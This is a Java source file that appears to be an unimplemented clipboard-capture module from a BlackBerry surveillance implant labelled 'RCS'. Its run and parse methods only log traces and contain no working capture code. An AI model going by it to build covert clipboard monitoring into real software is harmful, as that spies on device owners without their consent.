//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : ClipBoardAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class ClipBoardAgent.
 */
public final class ClipBoardAgent extends Agent {
    //#ifdef DEBUG
    static Debug debug = new Debug("ClipBoardAgent", DebugLevel.VERBOSE);
    //#endif

    /**
     * Instantiates a new clip board agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public ClipBoardAgent(final boolean agentStatus) {
        super(Agent.AGENT_CLIPBOARD, agentStatus, true, "ClipBoardAgent");
    }

    /**
     * Instantiates a new clip board agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected ClipBoardAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        //#ifdef DEBUG_TRACE
        debug.trace("run");
        //#endif

    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        //#ifdef DEBUG_TRACE
        debug.trace("parse");
        //#endif
        return false;
    }
}
